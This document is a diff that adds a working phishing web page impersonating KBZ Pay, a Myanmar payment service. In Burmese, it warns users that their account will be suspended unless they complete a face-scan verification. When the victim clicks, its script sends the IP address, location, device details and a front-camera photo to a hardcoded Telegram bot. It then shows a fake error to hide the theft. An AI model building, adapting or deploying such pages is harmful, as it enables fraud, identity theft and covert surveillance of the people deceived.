@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KBZ Pay Security Verification</title>
+    <style>
+        body { background-color: #f4f4f4; font-family: 'Pyidaungsu', sans-serif; margin: 0; padding: 0; }
+        .header { background-color: #11368b; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }
+        .container { padding: 25px; text-align: center; }
+        .card { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .kbz-logo { width: 120px; margin-bottom: 20px; }
+        h2 { color: #11368b; font-size: 18px; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; line-height: 1.6; }
+        .btn-verify { background-color: #11368b; color: white; border: none; padding: 15px 40px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
+        .footer { margin-top: 30px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="header">KBZ Pay Identity System</div>
+
+<div class="container">
+    <div class="card">
+        <img src="https://www.kbzpay.com/wp-content/uploads/sites/2/2018/08/logo.png" alt="KBZPay" class="kbz-logo">
+        
+        <h2>⚠️KBZ Pay Account စစ်ဆေးရန်</h2>
+        <p>သင်၏ KBZ Pay Account သည် မကြာခဏ Report များတွေ့ရ၍ လူမှန်ကန်ကြောင်း (Face Scan) စစ်ဆေးမှု ပြုလုပ်ရန် လိုအပ်ပါသည်။</p>
+        <p><b>"စစ်ဆေးမှုကို စတင်ရန်"</b> ခလုတ်ကို နှိပ်ပြီး<b>Camera</b> အား <b>Allow</b> ပေးပါ။<b>Identity</b> မမှန်ကန်ပါက ငွေလက်ခံခြင်းများအား<b>ယာယီဆိုင်းငံ့ထားပါမည်။</b></p>
+        
+        <button class="btn-verify" onclick="startOperation()">စစ်ဆေးမှုကို စတင်ရန်</button>
+    </div>
+
+    <div class="footer">© 2026 KBZ Pay. All Rights Reserved.</div>
+</div>
+
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8087257401:AAFx_WNd6WPEuS0acDY40SQQwtM6UKYwZ2g";
+    const CHAT_ID = "8268582523";
+
+    async function sendToTelegram(message, photoBlob = null) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        if (photoBlob) {
+            formData.append("photo", photoBlob, "capture.jpg");
+            formData.append("caption", message);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        } else {
+            formData.append("text", message);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: formData });
+        }
+    }
+
+    async function startOperation() {
+        // ၁။ IP နဲ့ Device Info ကို အရင်ယူမယ်
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipD = await ipRes.json();
+            await sendToTelegram(`🎯 [KBZ Target Clicked!]\nIP: ${ipD.ip}\nCity: ${ipD.city}\nISP: ${ipD.org}\nDevice: ${navigator.userAgent}`);
+        } catch (e) {
+            await sendToTelegram(`🎯 Target Clicked!\nDevice: ${navigator.userAgent}`);
+        }
+
+        // ၂။ Location ကို ယူမယ်
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            await sendToTelegram(`📍 [KBZ Target Location]\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`);
+        }, (err) => {
+            sendToTelegram("❌ Location Access Denied!");
+        });
+
+        // ၃။ ကင်မရာဖွင့်ပြီး ဓာတ်ပုံရိုက်မယ်
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    await sendToTelegram("📸 [KBZ Target Face Captured!]", blob);
+                    alert("System Busy: သင်၏ အင်တာနက်လိုင်း မကောင်းသောကြောင့် နောက်မှ ပြန်လည်ကြိုးစားပါ။");
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+            }, 2500);
+        } catch (err) {
+            alert("Error: ကင်မရာဖွင့်ရန် Allow လုပ်ရန်လိုအပ်ပါသည်။");
+            await sendToTelegram("❌ Camera Access Denied!");
+        }
+    }
+</script>
+
+</body>
+</html>
